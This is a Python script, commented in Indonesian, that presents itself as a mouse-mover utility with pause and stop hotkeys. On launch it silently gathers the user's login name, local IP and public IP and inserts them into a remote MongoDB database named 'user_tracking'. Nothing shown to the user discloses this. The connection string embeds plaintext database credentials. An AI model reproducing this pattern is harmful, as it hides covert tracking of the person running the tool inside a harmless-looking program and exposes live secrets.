import pyautogui
import threading
import time
import keyboard
import socket
import requests
from pymongo import MongoClient
from datetime import datetime
import getpass  # <== Tambahkan ini

# === SETUP MONGODB ===
client = MongoClient("mongodb+srv://zenkunenterkill13:renz7474@golangtested.9okyttx.mongodb.net/")  # Ganti jika pakai MongoDB Atlas
db = client["user_tracking"]
collection = db["ip_logs"]

# Variabel kontrol
running = True
paused = False

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        return f"Error lokal IP: {e}"

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
        return ip
    except Exception as e:
        return f"Error publik IP: {e}"

def simpan_ke_mongodb(username, local_ip, public_ip):
    data = {
        "username": username,
        "local_ip": local_ip,
        "public_ip": public_ip,
        "timestamp": datetime.now()
    }
    collection.insert_one(data)

def mouse_loop():
    global running, paused
    while running:
        if not paused:
            pyautogui.moveRel(100, 0, duration=0.2)
            pyautogui.moveRel(0, 100, duration=0.2)
            pyautogui.moveRel(-100, 0, duration=0.2)
            pyautogui.moveRel(0, -100, duration=0.2)
        time.sleep(0.1)

def hotkey_listener():
    global running, paused
    while running:
        if keyboard.is_pressed('0'):
            paused = not paused
            state = "Dijeda" if paused else "Dilanjutkan"
            print(f"[i] Gerakan mouse {state}.")
            time.sleep(0.5)

        if keyboard.is_pressed('esc'):
            running = False
            print("\n[!] ESC ditekan. Program dihentikan.")
            break
        time.sleep(0.1)

# === Ambil info awal ===
username = getpass.getuser()
local_ip = get_local_ip()
public_ip = get_public_ip()

simpan_ke_mongodb(username, local_ip, public_ip)

# Jalankan listener di thread terpisah
threading.Thread(target=hotkey_listener, daemon=True).start()

# Mulai loop mouse
print("\nGerakan mouse dimulai. Tekan '0' untuk pause/play, 'ESC' untuk berhenti.")
mouse_loop()
